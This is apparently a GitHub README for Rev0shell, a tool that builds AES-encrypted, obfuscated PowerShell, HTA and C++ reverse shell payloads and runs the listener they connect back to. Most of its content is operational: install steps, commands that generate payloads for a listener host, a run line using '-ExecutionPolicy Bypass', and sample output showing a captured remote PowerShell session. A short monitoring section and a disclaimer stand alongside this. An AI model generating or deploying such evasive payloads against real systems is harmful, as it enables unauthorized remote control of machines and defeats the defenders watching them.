
```id="rev0shell-readme-v2
# Rev0shell

A lightweight AES-encrypted reverse shell handler built for authorized security testing, red team simulations, and defensive research on Windows environments.

--------------------------------------------------

Features

- AES-256 encrypted payload packaging
- In-memory execution patterns (reduced disk artifacts)
- Obfuscated PowerShell generation (string splitting, randomization)
- Multi-format payloads (PowerShell, HTA, C++ EXE)
- Cross-platform workflow (Linux -> Windows)

--------------------------------------------------

What this tool demonstrates (defensive context)

Rev0shell is designed to help researchers and defenders understand how modern threats can:

- Conceal script intent using encryption and encoding
- Dynamically construct commands at runtime instead of storing them in plain text
- Blend into legitimate administrative activity using PowerShell
- Reduce static inspection visibility by altering how code is structured

These behaviors are commonly observed in real-world attacks and are important for improving detection and response strategies.

--------------------------------------------------

High-Level Workflow

[ Generator ]
      ↓
[ Encryption + Encoding ]
      ↓
[ Obfuscation Layer ]
      ↓
[ Staged Delivery ]
      ↓
[ Runtime Execution ]
      ↓
[ Connection to Listener ]

--------------------------------------------------

Defensive Notes

When analyzing systems, monitor for:

- PowerShell processes running encoded or dynamically generated commands
- High-entropy strings that may indicate encrypted content
- Unusual outbound network connections initiated by scripting engines
- Suspicious parent-child process relationships
- Script execution patterns that avoid writing clear content to disk

Recommended:

- Enable Script Block Logging and Module Logging
- Use behavior-based detection instead of only signatures
- Correlate process, memory, and network activity

--------------------------------------------------

Installation

git clone https://github.com/Luscious8/Rev0shell.git
cd Rev0shell

pip install -r requirements.txt
# or
pip install rich pycryptodome
--------------------------------------------------

<img width="1663" height="691" alt="Image" src="https://github.com/user-attachments/assets/0405d09c-bf4a-45ca-bd6b-b74b04ba7268" />
Usage

# Start listener
python rev0shell.py --lhost 192.168.1.6 --lport 4444

# Generate PowerShell payload
python rev0shell.py --lhost 192.168.1.6 --lport 4444 --generate

# Generate HTA payload
python rev0shell.py --lhost 192.168.1.6 --lport 4444 --hta

# Generate C++ EXE
python rev0shell.py --lhost 192.168.1.6 --lport 4444 --exe

# Custom output
python rev0shell.py --lhost 192.168.1.6 --lport 4444 --generate --output custom.ps1

# Custom encryption key
python rev0shell.py --lhost 192.168.1.6 --lport 4444 --key MySecretKey123

--------------------------------------------------

Command Reference

--lhost     Listener IP (required)
--lport     Listener port (required)
--key       Custom encryption key (default: REV0SHELL2026)
--generate  Generate PowerShell payload
--hta       Generate HTA payload
--exe       Generate C++ stager
--output    Output file name
--help      Show help

--------------------------------------------------

Example Workflow

# Listener
python rev0shell.py --lhost 192.168.1.6 --lport 4444

# Generate payload
python rev0shell.py --lhost 192.168.1.6 --lport 4444 --generate --output shell.ps1

# Execute in controlled lab
powershell -ExecutionPolicy Bypass -File shell.ps1

# Expected output
[*] Listening on 192.168.1.6:4444
[+] Connection received from 192.168.1.105:49732
PS C:\Users\victor>

--------------------------------------------------

Output Files

payload.ps1   -> PowerShell payload
payload.hta   -> HTA stager
stager.exe    -> C++ executable
unicorn.rc    -> Metasploit resource file

--------------------------------------------------

Requirements

- Python 3.8+
- Linux (Kali recommended)
- Windows 10/11 (lab testing only)
- Metasploit (optional)

--------------------------------------------------

Disclaimer

This tool is for educational and authorized security testing only.

Do NOT use on systems without explicit permission.
Unauthorized use is illegal.

The author assumes no responsibility for misuse.

--------------------------------------------------

Author

Luscious8

Security research focused on red team simulation and defensive awareness.
```

